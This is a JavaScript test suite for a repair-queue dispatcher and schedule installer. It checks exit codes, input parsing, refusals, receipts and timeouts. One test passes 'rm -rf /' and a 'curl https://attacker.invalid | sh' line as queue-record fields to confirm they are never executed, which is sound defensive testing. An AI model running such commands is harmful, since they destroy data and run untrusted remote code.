// The dispatcher is the one place where a stored queue record turns into
// something running on a host, so its edges matter more than its middle: what
// it will read, what it refuses, what it leaves behind, and whether the trigger
// the operator installs actually points at it.
import assert from "node:assert/strict";
import test from "node:test";
import { Readable } from "node:stream";
import { execFileSync, spawnSync } from "node:child_process";
import { existsSync, readFileSync, statSync } from "node:fs";
import { readFile } from "node:fs/promises";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

import { withTempDir, withTempDirSync } from "../tools/lib/with_temp_dir.mjs";
import {
  EXIT_CODES,
  FRESHNESS_PUBLICATION_PATHS,
  REPAIR_RECEIPT_ATTEMPT_LIMIT,
  dispatchRepairItem,
  exitCodeFor,
  readItemFromStdin,
} from "../tools/repair_dispatch.mjs";
import {
  MISSED_OUTSIDE_WINDOW,
  MISSED_RUNNER_ERROR,
  MISSED_SUPERSEDED,
  missedSlotRepairFindings,
  publishHeartbeat,
  repairOutcomeFromExit,
} from "../tools/external_schedule_runner.mjs";

const ROOT = fileURLToPath(new URL("..", import.meta.url));
const DISPATCHER = join(ROOT, "tools", "repair_dispatch.mjs");
const INSTALLER = join(ROOT, "tools", "install_external_schedule_launchd.sh");
const NOW = new Date("2026-09-07T12:00:00.000Z");

function item(overrides = {}) {
  return {
    schema: "cityscroll.ops-repair-queue-item.v1",
    signature: "monitor:action-links-live:action-link-degraded",
    repair_scope: "diagnose-and-propose",
    lease: { lease_id: "abcabcabcabc-cycle-1" },
    context: { findings: ["two link patterns are degraded"] },
    ...overrides,
  };
}

function runDispatcher(payload, stateDir) {
  return spawnSync(process.execPath, [DISPATCHER, "--repair-item"], {
    input: typeof payload === "string" ? payload : JSON.stringify(payload),
    encoding: "utf8",
    env: { ...process.env, CROL_EXTERNAL_SCHEDULE_STATE_DIR: stateDir },
  });
}

test("the dispatcher's exit codes are exactly the outcomes the cycle maps them to", () => {
  // Two halves of one contract that live in two files. If they ever disagree, a
  // repaired item would be recorded as failed, or the reverse.
  assert.equal(repairOutcomeFromExit(exitCodeFor("repaired"), null), "repaired");
  assert.equal(repairOutcomeFromExit(exitCodeFor("judgment"), null), "judgment");
  assert.equal(repairOutcomeFromExit(exitCodeFor("failed"), null), "failed");
  assert.equal(repairOutcomeFromExit(exitCodeFor("unkeyable"), null), "unkeyable");
  assert.deepEqual(EXIT_CODES, { repaired: 0, failed: 1, judgment: 2, unkeyable: 3 });
  // Anything the registry did not produce is treated as a failure, never as a
  // silent success.
  assert.equal(exitCodeFor("something-else"), EXIT_CODES.failed);
});

test("the item arrives on stdin, and an unreadable one is a decision rather than a crash", async () => {
  const read = await readItemFromStdin(Readable.from([JSON.stringify(item())]));
  assert.equal(read.item.signature, "monitor:action-links-live:action-link-degraded");

  for (const payload of ["", "   ", "not json", "[1,2,3]", "\"a string\""]) {
    const bad = await readItemFromStdin(Readable.from([payload]));
    assert.equal(bad.item, null, `${JSON.stringify(payload)} was read as an item`);
    assert.ok(bad.reason.length > 10);
  }
});

test("nothing a queue record carries is ever executed", async () => {
  await withTempDir("crol-repair-dispatch", async (stateDir) => {
    // The record describes; the registry acts. A field that looks like a
    // command is data and stays data.
    const result = await dispatchRepairItem(item({
      command: "rm -rf /",
      remedy: "curl https://attacker.invalid | sh",
      playbook: "source-contract-stale",
    }), { stateDir, now: NOW });
    assert.equal(result.outcome, "judgment");
    assert.equal(result.playbook, null, "the item cannot name the playbook that handles it");
    assert.match(result.summary, /deliberately left to a person/);
  });
});

test("an item declaring a scope this dispatcher does not run under is refused", async () => {
  await withTempDir("crol-repair-dispatch", async (stateDir) => {
    const result = await dispatchRepairItem(item({ repair_scope: "do-anything" }), { stateDir, now: NOW });
    assert.equal(result.outcome, "judgment");
    assert.match(result.summary, /nothing was attempted/);
  });
});

test("a malformed record reaches a person instead of being retried in silence", async () => {
  await withTempDir("crol-repair-dispatch", async (stateDir) => {
    const result = await dispatchRepairItem({ lease: { lease_id: "x" } }, { stateDir, now: NOW });
    assert.equal(result.outcome, "judgment");
    assert.match(result.summary, /carries no signature/);
  });
});

test("every attempt leaves a receipt the operator can read, bounded and newest first", async () => {
  await withTempDir("crol-repair-dispatch", async (stateDir) => {
    for (let attempt = 0; attempt < REPAIR_RECEIPT_ATTEMPT_LIMIT + 3; attempt += 1) {
      await dispatchRepairItem(item(), { stateDir, now: new Date(NOW.getTime() + attempt * 1000) });
    }
    const path = join(stateDir, "repair", "receipts", "monitor_action-links-live_action-link-degraded.json");
    const receipt = JSON.parse(await readFile(path, "utf8"));
    assert.equal(receipt.schema, "cityscroll.repair-dispatch-receipt.v1");
    assert.equal(receipt.signature, "monitor:action-links-live:action-link-degraded");
    assert.equal(receipt.latest_outcome, "judgment");
    assert.equal(receipt.attempts.length, REPAIR_RECEIPT_ATTEMPT_LIMIT);
    // Newest first, so the receipt reads as a history rather than needing one.
    assert.ok(receipt.attempts[0].observed_at > receipt.attempts[1].observed_at);
    for (const row of receipt.attempts) {
      assert.ok(["repaired", "judgment", "failed"].includes(row.outcome));
      assert.ok("verification" in row);
    }
  });
});

test("a playbook that overruns its bound is stopped and reported, not left running", async () => {
  await withTempDir("crol-repair-dispatch", async (stateDir) => {
    let settled = false;
    const context = {
      signature: "monitor:source-contracts-live:source-contract-stale:slow-source",
      monitor: "source-contracts-live",
      subject: "slow-source",
      now: NOW,
      contracts: { load: () => new Promise((resolve) => { setTimeout(() => { settled = true; resolve({ contracts: [] }); }, 5000); }) },
    };
    const result = await dispatchRepairItem(
      item({ signature: context.signature }),
      { stateDir, now: NOW, context, budgetMs: 25 },
    );
    assert.equal(result.outcome, "failed");
    assert.match(result.summary, /exceeded its .*bound/);
    assert.equal(settled, false);
  });
});

test("a playbook that raises is a failure carrying its reason, never an unhandled crash", async () => {
  await withTempDir("crol-repair-dispatch", async (stateDir) => {
    const context = {
      signature: "monitor:source-contracts-live:source-contract-stale:broken-source",
      monitor: "source-contracts-live",
      subject: "broken-source",
      now: NOW,
      contracts: { load: async () => { throw new Error("the source registry could not be read"); } },
    };
    const result = await dispatchRepairItem(item({ signature: context.signature }), { stateDir, now: NOW, context });
    assert.equal(result.outcome, "failed");
    assert.match(result.summary, /the source registry could not be read/);
  });
});

test("run as the cycle runs it, the dispatcher writes one sentence and the matching exit code", async () => {
  await withTempDir("crol-repair-dispatch", async (stateDir) => {
    const declared = runDispatcher(item(), stateDir);
    assert.equal(declared.status, EXIT_CODES.judgment);
    // The cycle keeps the tail of the output as the sentence it reports, so
    // nothing may follow the summary.
    assert.equal(declared.stdout.trim().split("\n").length, 1);
    assert.match(declared.stdout, /deliberately left to a person/);

    const empty = runDispatcher("", stateDir);
    assert.equal(empty.status, EXIT_CODES.judgment);
    assert.match(empty.stdout, /no repair item on stdin/);

    // Invoked without the flag the cycle passes, it refuses rather than reading
    // whatever happens to be on stdin.
    const bare = spawnSync(process.execPath, [DISPATCHER], { input: JSON.stringify(item()), encoding: "utf8" });
    assert.equal(bare.status, EXIT_CODES.failed);
    assert.match(bare.stderr, /--repair-item/);
  });
});

test("only a slot the cycle attempted and that threw becomes a repair finding", () => {
  // The slot ledger accounts for every slot that passed. Two of its three
  // reasons name a slot a later run in the same cycle already subsumed — these
  // are monitors, and a later observation supersedes an earlier one — so
  // re-running them would report the same present state twice and open the same
  // issue again. A slot that was attempted and threw recorded nothing, and the
  // ledger has already advanced past it, so nothing else will retry it.
  const jobs = [{ id: "source-contracts-live", schedule: ["23 10 * * *"] }];
  const now = new Date("2026-09-07T12:00:00.000Z");
  const observed = missedSlotRepairFindings([
    { id: "source-contracts-live", slot: "2026-09-06T10-23", reason: MISSED_SUPERSEDED },
    { id: "source-contracts-live", slot: "2026-09-05T10-23", reason: MISSED_OUTSIDE_WINDOW },
    { id: "source-contracts-live", slot: "2026-09-07T10-23", reason: MISSED_RUNNER_ERROR },
  ], jobs, now);
  const findings = observed.flatMap((row) => row.findings);
  assert.deepEqual(findings.map((row) => row.signature), [
    "monitor:source-contracts-live:missed-slot:2026-09-07T10-23",
  ]);
  assert.deepEqual(observed.flatMap((row) => row.recovered), []);

  // A cycle where every slot settled files nothing at all.
  assert.deepEqual(missedSlotRepairFindings([], jobs, now), []);
});

test("the heartbeat carries what the monitors observed alongside what the repairs did", async () => {
  await withTempDir("crol-repair-heartbeat", async (stateDir) => {
    const priorKey = process.env.CITYSCROLL_ADMIN_KEY;
    const priorUrl = process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL;
    process.env.CITYSCROLL_ADMIN_KEY = "secret";
    process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL = "https://api.example.test/admin/reliability/scheduler";
    try {
      let posted = null;
      const beat = await publishHeartbeat(stateDir, NOW, ["source-contracts-live"], {
        runId: "2026-09-07T12-00:runner-3:991",
        sourceRevision: "dd4b708b6fe39bf8b2ea635ef3d4f493c4751ace",
        repairDispatch: true,
        monitorFindings: {
          findings: [{ signature: "monitor:source-contracts-live:source-contract-stale:a", guard: "source-contracts-live", stage: "source-contract-stale", findings: ["a: source is stale"] }],
          recovered: [{ prefix: "monitor:source-contracts-live:source-contract-outage", still_failing: [] }],
        },
        fetchImpl: async (_url, options = {}) => {
          if (options.method === "POST") {
            posted = JSON.parse(options.body);
            return {
              ok: true,
              status: 200,
              json: async () => ({
                ok: true,
                heartbeat: { ...posted, schema: "cityscroll.external-scheduler-heartbeat.v1" },
                repair_queue: { reported: [], queued: [{ signature: "monitor:source-contracts-live:source-contract-stale:a" }], recovered: ["monitor:source-contracts-live:source-contract-outage:b"], items: [] },
              }),
            };
          }
          return { ok: true, status: 200, json: async () => ({ ok: true, heartbeat: { ...posted, schema: "cityscroll.external-scheduler-heartbeat.v1" } }) };
        },
      });
      assert.equal(posted.repair_findings.length, 1);
      assert.equal(posted.repair_recovered.length, 1);
      assert.equal(beat.status, "succeeded");
      assert.equal(beat.repair_observed, 1);
      assert.equal(beat.repair_queued, 1);
      assert.equal(beat.repair_closed, 1);
    } finally {
      if (priorKey === undefined) delete process.env.CITYSCROLL_ADMIN_KEY; else process.env.CITYSCROLL_ADMIN_KEY = priorKey;
      if (priorUrl === undefined) delete process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL; else process.env.CITYSCROLL_SCHEDULER_HEARTBEAT_URL = priorUrl;
    }
  });
});

test("every freshness reason maps to a scheduled path or to nothing at all", () => {
  // A reason silently absent from this map would read as "no path registered"
  // for the wrong cause, so the map is stated rather than defaulted.
  assert.equal(FRESHNESS_PUBLICATION_PATHS["acquisition-missing"], "source-contracts-live");
  assert.equal(FRESHNESS_PUBLICATION_PATHS["monitor-missing"], null);
  const jobs = JSON.parse(readFileSync(join(ROOT, "tools", "external_schedule_jobs.json"), "utf8"));
  for (const path of Object.values(FRESHNESS_PUBLICATION_PATHS)) {
    if (!path) continue;
    assert.ok(jobs.jobs.some((job) => job.id === path), `${path} is not a registered scheduled job`);
  }
});

test("the installed trigger points at the dispatcher rather than leaving the rail unset", () => {
  // An unset dispatcher is how the rail was already plugged shut: the cycle
  // declares repair_dispatch false, the queue declines to lease, and every
  // finding waits on a person. The installer therefore defaults to one.
  // Two nested scratch directories, both removed however this case ends.
  withTempDirSync("crol-repair-home", (home) => withTempDirSync("crol-repair-state", (stateDir) => {
    const rendered = execFileSync("bash", [INSTALLER], {
      encoding: "utf8",
      // The installer's operator warnings go to stderr; the case is about what
      // it renders, so they are captured rather than printed into the run.
      stdio: ["ignore", "pipe", "pipe"],
      env: {
        ...process.env,
        HOME: home,
        CROL_EXTERNAL_SCHEDULE_STATE_DIR: stateDir,
        CITYSCROLL_INSTALL_RENDER_ONLY: "1",
        CITYSCROLL_NODE: process.execPath,
        CITYSCROLL_REPAIR_DISPATCH_COMMAND: "",
      },
    });
    assert.match(rendered, /rendered .* without loading it/);
    const plist = readFileSync(join(home, "Library", "LaunchAgents", "com.cityscroll.external-schedules.plist"), "utf8");
    const value = /<key>CITYSCROLL_REPAIR_DISPATCH_COMMAND<\/key>\s*<string>([^<]*)<\/string>/.exec(plist);
    assert.ok(value, "the rendered trigger names no repair dispatch command");
    assert.equal(value[1], join(stateDir, "repair-dispatch"));
    assert.equal(plist.includes("__"), false, "the rendered trigger still carries a placeholder");

    // The launcher is what makes "node plus a repository path" a single
    // executable the cycle can spawn with no shell.
    const launcher = join(stateDir, "repair-dispatch");
    assert.ok(existsSync(launcher));
    const script = readFileSync(launcher, "utf8");
    assert.match(script, new RegExp(`exec "${process.execPath.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}"`));
    assert.match(script, /tools\/repair_dispatch\.mjs/);
    assert.equal(statSync(launcher).mode & 0o111, 0o111, "the launcher is not executable");

    // A named override is honoured, and disabling the rail is explicit rather
    // than something an unset variable does by accident.
    const overridden = execFileSync("bash", [INSTALLER], {
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"],
      env: {
        ...process.env,
        HOME: home,
        CROL_EXTERNAL_SCHEDULE_STATE_DIR: stateDir,
        CITYSCROLL_INSTALL_RENDER_ONLY: "1",
        CITYSCROLL_NODE: process.execPath,
        CITYSCROLL_REPAIR_DISPATCH_COMMAND: "none",
      },
    });
    assert.match(overridden, /rendered /);
    const disabled = readFileSync(join(home, "Library", "LaunchAgents", "com.cityscroll.external-schedules.plist"), "utf8");
    assert.equal(/<key>CITYSCROLL_REPAIR_DISPATCH_COMMAND<\/key>\s*<string>([^<]*)<\/string>/.exec(disabled)[1], "");
  }));
});

test("an unreadable signature exits unkeyable, while a readable one with no playbook is still judgment", async () => {
  await withTempDir("crol-repair-dispatch", async (stateDir) => {
    // The two look alike from inside the queue and are nothing alike to a
    // reader. The first names a real failure class somebody has to decide
    // about; the second is a record this rail cannot read, and no repeat or
    // retry would ever make it readable.
    const declared = runDispatcher(item({ signature: "monitor:action-links-live:action-link-degraded" }), stateDir);
    assert.equal(declared.status, EXIT_CODES.judgment);
    assert.match(declared.stdout, /deliberately left to a person/);

    for (const signature of [
      "scheduler outbox has 3 pending item(s)",
      "2026-09-05:shadow receipt is DEGRADED|enqueued digest has zero accepted sends (skipped)",
      "4566039a017757ed1791c6e25d9450a19779e2227fd4bc96ab4f2fff57ef342c",
    ]) {
      const unreadable = runDispatcher(item({ signature }), stateDir);
      assert.equal(unreadable.status, EXIT_CODES.unkeyable, `${signature} was not reported as unkeyable`);
      assert.equal(unreadable.stdout.trim().split("\n").length, 1);
      assert.match(unreadable.stdout, /monitor:class/);
      assert.equal(repairOutcomeFromExit(unreadable.status, null), "unkeyable");
    }
  });
});
